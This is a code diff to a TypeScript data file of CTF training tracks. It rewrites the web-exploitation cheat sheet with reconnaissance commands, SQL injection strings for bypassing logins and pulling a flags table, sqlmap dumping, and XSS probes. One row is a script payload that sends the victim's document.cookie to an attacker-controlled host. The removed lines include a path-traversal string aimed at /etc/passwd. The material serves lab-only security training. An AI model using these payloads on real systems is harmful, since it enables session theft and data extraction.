@@ -153,18 +153,30 @@ export const tracks: Record<string, Track> = {
     blurb: "The biggest CTF surface. Map the app, abuse trust boundaries, and chain small flaws into impact. Pairs directly with the OWASP Top 10 track. Lab targets only.",
     skills: ["HTTP & proxies", "injection", "auth/session flaws", "IDOR", "SSRF & traversal", "APK/IPA analysis"],
     sheets: [
-      { title: "Web recon & testing (authorized labs)", rows: [
-        { code: "robots.txt, sitemap.xml, /.git/", note: "Low-hanging exposure" },
-        { code: "ffuf -u URL/FUZZ -w wordlist.txt", note: "Content / parameter discovery" },
-        { code: "' OR '1'='1   —   UNION SELECT …", note: "SQLi test strings -> parameterize to fix" },
-        { code: "<img src=x onerror=alert(1)>", note: "XSS probe -> encode output + CSP to fix" },
-        { code: "../../../../etc/passwd", note: "Path traversal / LFI test" },
+      { title: "Read the response (where flags hide)", rows: [
+        { code: "curl -i http://app/", note: "Show response headers + body — flags hide in X- headers" },
+        { code: "curl http://app/api/... | grep -iE 'ctf|flag'", note: "Grep raw JSON/HTML the UI never shows" },
+        { code: "robots.txt · sitemap.xml · /.git/ · *.js.map", note: "Low-hanging exposure & source leaks" },
+        { code: "ffuf -u http://app/FUZZ -w wordlist.txt", note: "Discover hidden paths & parameters" },
       ]},
-      { title: "Mobile analysis", rows: [
-        { code: "apktool d app.apk", note: "Decode resources & manifest" },
-        { code: "jadx-gui app.apk", note: "Decompile to readable Java" },
-        { code: 'grep -ri "api_key\\|secret" ./app', note: "Hardcoded secrets" },
-        { code: "MobSF (static+dynamic)", note: "Automated mobile app scan" },
+      { title: "SQL injection -> read the flag", rows: [
+        { code: "?id=1'", note: "Detect: a SQL error means it's injectable" },
+        { code: "?id=1' OR '1'='1-- -", note: "Boolean bypass (login/filter)" },
+        { code: "UNION SELECT table_name,2 FROM information_schema.tables", note: "Enumerate table names" },
+        { code: "?id=-1 UNION SELECT flag,2 FROM flags-- -", note: "Extract: flag lands where the name renders" },
+        { code: "sqlmap -u 'http://app/item?id=1' --dump", note: "Automate detection + dump tables" },
+      ]},
+      { title: "XSS -> steal the flag", rows: [
+        { code: "?q=<b>x</b>", note: "Confirm: comes back bold = unescaped = XSS" },
+        { code: "<img src=x onerror=alert(1)>", note: "Prove script execution" },
+        { code: "<script>new Image().src='//me/'+document.cookie</script>", note: "Exfiltrate the admin/victim cookie" },
+      ]},
+      { title: "Mobile (APK) analysis", rows: [
+        { code: "apktool d app.apk   ·   jadx -d out/ app.apk", note: "Decompile resources, manifest & Java" },
+        { code: "aapt dump permissions app.apk", note: "List permissions without decompiling" },
+        { code: "cat app/AndroidManifest.xml", note: "uses-permission, usesCleartextTraffic, exported, debuggable" },
+        { code: 'grep -ri "api_key\\|secret\\|HHB" app/res/', note: "Hardcoded secrets in strings.xml / resources" },
+        { code: "MobSF (static+dynamic)", note: "Automated mobile (MAST) scan" },
       ]},
     ],
     tools: ["Burp Suite", "OWASP ZAP", "ffuf", "gobuster", "sqlmap", "nikto", "jadx", "apktool", "Frida", "MobSF"],
